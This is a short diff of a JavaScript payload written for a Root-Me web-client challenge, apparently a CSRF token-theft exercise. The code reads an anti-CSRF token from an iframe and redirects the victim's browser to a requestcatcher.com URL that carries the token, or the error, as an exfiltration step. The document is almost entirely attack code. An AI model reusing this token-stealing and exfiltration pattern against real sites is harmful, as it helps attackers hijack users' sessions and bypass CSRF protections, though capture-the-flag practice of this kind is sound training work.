@@ -1,8 +1,7 @@
-const body1 = document.querySelector("body")
-
-const ifr = document.createElement("iframe")
-ifr.src = "http://challenge01.root-me.org/web-client/ch23/index.php?action=profile"
-body1.appendChild(ifr)
-
-const token = ifr.contentWindow.document.querySelector("#token")
+try {
+const ifr = document.querySelector("#principalIframe")
+const token = ifr.contentDocument.querySelector("#token")
 window.location.href = `https://uj54uj.requestcatcher.com/${token}`
+}catch(err) {
+window.location.href = `https://uj54uj.requestcatcher.com/${err}`
+}
